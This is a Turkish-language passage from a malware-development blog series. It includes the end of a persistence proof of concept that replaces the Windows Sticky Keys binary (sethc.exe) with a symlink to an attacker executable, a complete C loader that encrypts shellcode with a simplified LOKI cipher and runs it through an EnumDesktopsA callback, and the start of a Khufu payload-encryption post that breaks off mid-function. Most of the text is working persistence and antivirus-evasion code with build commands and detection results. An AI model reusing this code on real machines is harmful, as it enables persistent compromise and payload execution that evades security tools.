if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
res = FALSE;
if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
printf(res ? "successfully enable %s :)\n" :
"failed to enable %s :(\n"
,
priv);
return res;
}
int main() {
// path to the legitimate binary (e.g., Sticky Keys)
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
// path to the malicious binary
const char* meowApp = "Z:\\hack.exe";

if (!setPrivilege(SE_TAKE_OWNERSHIP_NAME)) return-1;
if (!setPrivilege(SE_DEBUG_NAME)) return-1;
if (!setPrivilege(SE_RESTORE_NAME)) return-1;
if (!setPrivilege(SE_BACKUP_NAME)) return-1;

HANDLE hFile = CreateFileA((LPCSTR)legitApp, GENERIC_WRITE,
FILE_SHARE_READ, NULL, OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL, NULL);

// obtain the SID for the current user
HANDLE hToken;
DWORD dwSize = 0;
PTOKEN_USER pTokenUser = NULL;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
printf("Failed to open process token: %d\n", GetLastError());
CloseHandle(hFile);
return 1;
}
printf("open process token: ok\n");

// get the required size for the token information
GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
pTokenUser = (PTOKEN_USER)malloc(dwSize);
if (pTokenUser == NULL) {
printf("failed to allocate memory for token information\n");
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("allocate memory token info: ok\n");

// get the token information
if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
printf("failed to get token information: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("get token info: ok\n");

// initialize a security descriptor
SECURITY_DESCRIPTOR sd;
if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
printf("failed to initialize security descriptor: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("init security descriptor: ok\n");

// set the owner in the security descriptor
if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
printf("failed to set security descriptor owner: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting security descriptor owner: ok\n");

// apply the security descriptor to the file
if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
printf("error setting file ownership: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting file ownership: ok\n");

// set full control for the current user
EXPLICIT_ACCESS ea;
PACL pNewAcl = NULL;

ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
ea.grfAccessPermissions = GENERIC_ALL;
ea.grfAccessMode = SET_ACCESS;
ea.grfInheritance = NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;

if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
printf("error setting new ACL: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting new ACL: ok\n");

if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL,
NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
printf("error setting security info: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
LocalFree(pNewAcl);
return 1;
}
printf("setting security info: ok\n");

free(pTokenUser);
CloseHandle(hToken);
LocalFree(pNewAcl);

// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
printf("error deleting original file: %d\n", GetLastError());
return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

HMODULE kernel = GetModuleHandle("kernel32.dll");
pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))
GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

// create the symbolic link
if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
printf("error creating symlink: %d\n", GetLastError());
return 1;
}
printf("symlink to meow created successfully =^..^=\n");
return 0;
}
Dikkat edin, bu PoC, Windows API işlevleri, dosya güvenliği ve SID (Security Identifier) işleme için gerekli başlık dosyalarını içerir. Ayrıca, CreateSymbolicLinkA fonksiyonuna bir işlev işaretçisi içerir (mingw derleyicim hatasız derlemeyi reddettiği için).
Demo
Şimdi her şeyi çalışırken görelim.
Meow-meow “kötü amaçlı yazılımımızı” hack.c derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
Ve kalıcılık betiğimizi derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra, test kurban makinemizde (Windows 11 x64) çalıştıralım:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, sembolik bağlantı başarıyla oluşturuldu.
Son olarak, Shift tuşuna 5 kez basalım:
+++++++++++++++++++++++++++++++++++++++++++++++
hack.exe dosyasının özelliklerine dikkat edin:
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey beklendiği gibi çalıştı. Mükemmel!=..=
Bu PoC, bir saldırganın bir Erişilebilirlik özelliğini kötü amaçlı bir yürütülebilir dosyaya yönlendirmek için nasıl sembolik bağlantı oluşturabileceğini göstermektedir.
Bu gönderinin, mavi takım çalışanlarının bu ilginç teknik hakkında farkındalığını artırmasını ve kırmızı takım üyeleri için bir silah eklemesini umuyorum.
CreateSymbolicLinkA
Malware persistence - part 12. Accessibility features
Github’taki kaynak kod

92.Kötü amaçlı yazılım ve kriptografi araştırması - bölüm 1 (29): LOKI payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, payload’u farklı bir mantıkla şifreleyerek antivirüs motorlarından kaçınma konusundaki kendi araştırmamın bir sonucudur: LOKI simetrik anahtar blok şifreleme. Her zamanki gibi çeşitli kripto algoritmalarını incelerken, bunu payload’u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.

LOKI

Lawrie Brown, Josef Pieprzyk ve Jennifer Seberry adlı üç Avustralyalı kriptograf, LOKI’yi (LOKI89) ilk olarak 1990 yılında “LOKI” adı altında yayımladı. LOKI89, inceleme için Avrupa RIPE projesine sunuldu, ancak seçilmedi. LOKI, DES’e olası bir alternatif olarak sunuldu.

pratik örnek

Hadi bunu uygulayalım. LOKI algoritması 64 bitlik bir blok ve 64 bitlik bir anahtar kullanır. LOKI blok şifreleme fonksiyonu, bir Feistel yapısı üzerinden birden çok tur boyunca şifreleme yapar. Aşağıda bu fonksiyonun nasıl çalıştığının ayrıntılı adım adım açıklaması bulunmaktadır:

void loki_encrypt(u8 *block, u8 *key) {
// LOKI encryption (simplified for demo)
u32 left = ((u32)block[0] << 24) |
((u32)block[1] << 16) | ((u32)block[2] << 8) |
(u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];

for (int round = 0; round < ROUNDS; round++) {
u32 temp = right;
right = left ^ (right + ((u32)key[round % KEY_SIZE]));
left = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
64 bitlik blok iki 32 bitlik yarıya bölünür: sol ve sağ:
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];
Sol yarı (left), bloğun ilk dört baytının birleştirilmesiyle oluşturulur.
Sağ yarı (right), bloğun son dört baytının birleştirilmesiyle oluşturulur.


Şifreleme işlemi birden çok tur içerir (benim uygulamamda 16 tur):
for (int round = 0; round < ROUNDS; round++) {
u32 temp = right;
right = left ^ (right + ((u32)key[round % KEY_SIZE]));
left = temp;
}
Her tur için:


• temp, mevcut right değerini saklar.
• right, left ve right ile bir anahtar değerin toplamının XOR işlemi uygulanmasıyla güncellenir. Anahtar değeri, key[round % KEY_SIZE] kullanılarak döngüsel olarak seçilir.
• left, temp değişkeninde saklanan önceki right değerine güncellenir.


Son olarak, şifrelenmiş bloğun mantığını yeniden oluşturma:
block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
Tüm turlar tamamlandıktan sonra, sol ve sağ yarılar orijinal bloğa geri birleştirilir.
32 bitlik left ve right değerleri baytlara bölünerek tekrar blok dizisine kaydedilir.


Benim örneğimde, bu fonksiyon LOKI şifreleme sürecinin temel işlemlerine odaklanarak verilerin bölünmesi, işlenmesi ve yeniden birleştirilmesini içeren basitleştirilmiş bir görünüm sunmaktadır.

Ardından, şifre çözme mantığını yeniden uygulama:
void loki_decrypt(u8 *block, u8 *key) {
// LOKI decryption (simplified for demo)
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];

for (int round = ROUNDS - 1; round >= 0; round--) {
u32 temp = left;
left = right ^ (left + ((u32)key[round % KEY_SIZE]));
right = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
Daha sonra, LOKI blok şifreleme kullanarak belirli bir shellcode'u şifrelemek için loki_encrypt_shellcode fonksiyonuna ihtiyacımız var:
void loki_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}
Nasıl çalışır?

Shellcode'u 8 baytlık bloklar halinde döngüye sok:
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
Her 8 baytlık blok için, mevcut blok ve şifreleme anahtarı ile loki_encrypt fonksiyonu çağrılır. shellcode + i * BLOCK_SIZE, shellcode içindeki mevcut 8 baytlık bloğun adresini hesaplar.


Tüm tam 8 baytlık bloklar işlendiğinde, fonksiyon eksik kalan ve tam bir blok oluşturmayan bayt olup olmadığını kontrol eder.
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
Not: Her zamanki gibi, bir doldurma dizisi (padding array) pad, 8 bayt uzunluğunda ve 0x90 (x86 assembly’de NOP talimatı) ile başlatılmıştır.


Bu fonksiyon, LOKI algoritmasını kullanarak tüm shellcode'un, uzunluğu ne olursa olsun, düzgün şekilde şifrelenmesini sağlar ve eksik blokları uygun şekilde işler.


Ardından, şifre çözme mantığını oluştur:
void loki_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}
Son payload’u çalıştırmak için tam kaynak kodu (hack.c) şu şekildedir:
/*
* hack.c
* encrypt/decrypt payload via LOKI
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/16/malware-cryptography-29.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 16
#define BLOCK_SIZE 8
#define KEY_SIZE 8

typedef uint32_t u32;
typedef uint8_t u8;

u8 key[KEY_SIZE] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};
void loki_encrypt(u8 *block, u8 *key) {
// LOKI encryption (simplified for demo)
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];
for (int round = 0; round < ROUNDS; round++) {
u32 temp = right;
right = left ^ (right + ((u32)key[round % KEY_SIZE]));
left = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
827block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void loki_decrypt(u8 *block, u8 *key) {
// LOKI decryption (simplified for demo)
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];

for (int round = ROUNDS - 1; round >= 0; round--) {
u32 temp = left;
left = right ^ (left + ((u32)key[round % KEY_SIZE]));
right = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void loki_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

void loki_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len);
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

loki_encrypt_shellcode(padded, pad_len);

printf("encrypted shellcode: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

loki_decrypt_shellcode(padded, pad_len);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}

printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Gördüğünüz gibi, payload’u çalıştırmak için EnumDesktopsA tekniğini kullandım.

Ayrıca her zamanki gibi, basit olması için meow-meow messagebox payload’unu kullandım:
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
Doğruluğu kontrol etmek için karşılaştırma ve yazdırma mantığını ekledim.

demo

Hadi her şeyi çalışırken görelim. Derleyelim (kendi Kali makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, bunu kurbanın makinesinde çalıştırın (benim durumumda Windows 11 x64):
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı! =..=


Shannon entropisini hesapla:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

.text bölümündeki payload’umuz.

Hadi bu hack.exe dosyasını VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/04bede4d03cd8f610fa90c4d41e1439e3adcd66069a378b9db4f94e62a7572cd/detection

Gördüğünüz gibi, yalnızca 73 AV motorundan 27'si dosyamızı kötü amaçlı olarak tespit etti.


Ancak, bu sonucun nedeni payload’un şifrelenmesi değil, VirtualAlloc, RtlMoveMemory ve EnumDesktopsA gibi bazı Windows API çağrılarıdır.


Biham ve Shamir, diferansiyel kriptanaliz kullanarak LOKI'yi 11 veya daha az turda verimli bir şekilde çözmeyi başardılar ve bu, brute force yöntemlerinden daha hızlıydı.


Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalıdır, mavi takımın bu ilginç şifreleme tekniğinden haberdar olmasını sağlar ve kırmızı takımın cephaneliğine yeni bir silah ekler.
LOKI
Malware and cryptography 1
Gıthub’taki kaynak kod


93. Kötü amaçlı yazılım ve kriptografi araştırması - bölüm 2 (30): Khufu payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, kötü amaçlı yazılım geliştirme sırasında Khufu Feistel şifreleme algoritmasını kullanma konusundaki kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bunu payload’u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
Khufu
Khufu, 64 bitlik veri blokları üzerinde çalışan bir kriptografik algoritmadır. 64 bitlik düz metin, başlangıçta her biri 32 bitten oluşan iki eşit yarıya bölünür. Bu yarılara L ve R adı verilir. Başlangıçta, her iki yarı da belirli bir anahtar malzemesi kümesiyle XOR işlemine tabi tutulur.
Daha sonra, DES’e benzeyen bir dizi turdan geçerler. Her döngü sırasında, bir S-kutusuna giriş, L'nin en az anlamlı baytıdır. Her S-kutusu 8 giriş biti ve 32 çıkış biti içerir. S-kutusundaki 32 bitlik eleman seçildikten sonra, XOR işlemi kullanılarak R ile birleştirilir. Ardından, L 8 bitin katları kadar döndürülür ve ardından L ve R yer değiştirir. Bu, turun sonunu işaret eder. S-kutusu dinamiktir ve her 8 turda bir ayarlamalara tabi tutulur.
Son olarak, önceki turun tamamlanmasının ardından, L ve R’nin değerleri ek anahtar malzemesi ile XOR işlemine tabi tutulur. Daha sonra, birlikte birleştirilerek şifreli metin bloğu oluşturulur.
Pratik örnek
Öncelikle, önceden tanımlanmış değerlerle başlatılan 64 baytlık bir dizi (anahtar) gereklidir:
uint8_t key[KEY_SIZE] = {
0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F
};
Ayrıca, şifreleme ve şifre çözme sırasında yerine koyma işlemi için kullanılan 256 elemanlı bir dizi olan S-kutusu (sbox) gereklidir:
uint32_t sbox[256];
void khufu_generate_sbox(uint8_t *key, int round) {
for (int i = 0; i < 256; i++) {
sbox[i] = (key[(round * 8 + i) % KEY_SIZE] << 24) |
(key[(round * 8 + i + 1) % KEY_SIZE] << 16) |
(key[(round * 8 + i + 2) % KEY_SIZE] << 8) |
key[(round * 8 + i + 3) % KEY_SIZE];
}
}
Khufu S-kutusu oluşturma fonksiyonu - Bu fonksiyon, anahtarı kullanarak her tur için bir S-kutusu üretir. Her S-kutusu elemanı için fonksiyon, dört anahtar baytı (uygun şekilde kaydırılmış) birleştirerek 32 bitlik bir değer oluşturur.
Sıradaki fonksiyon Khufu şifreleme fonksiyonudur:
void khufu_encrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) | ((uint32_t)key
[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) | ((uint32_t)key
[6] << 8) | (uint32_t)key[7];

for (int round = 0; round < ROUNDS; round++) {
khufu_generate_sbox(key, round);
uint32_t temp = left;
left = right ^ sbox[left & 0xFF];
right = (temp >> 8) | (temp << 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) | ((uint32_t)key
[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) | ((uint32_t)
key[14] << 8) | (uint32_t)key[15];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
Burada ne oluyor? Öncelikle, 8 baytlık blok iki 32 bitlik yarıya (sol ve sağ) bölünür. Daha sonra, başlangıç anahtar planlaması sol ve sağ yarıları anahtar değerleriyle XOR işlemine tabi tutar. Her tur için:
Tur için S-kutusu oluşturulur.
Sol yarı, solun en az anlamlı baytı tarafından indekslenen S-kutusu değeriyle XORlanarak güncellenir.
Sağ yarı 8 bit döndürülür.
Sol ve sağ yarılar yer değiştirir.


Son anahtar planlaması, sol ve sağ yarıları anahtar değerleriyle XOR işlemine tabi tutar.
Sıradaki süreç şifre çözme işlemidir. Şifre çözme mantığı, şifreleme sürecinin tersidir:
void khufu_decrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
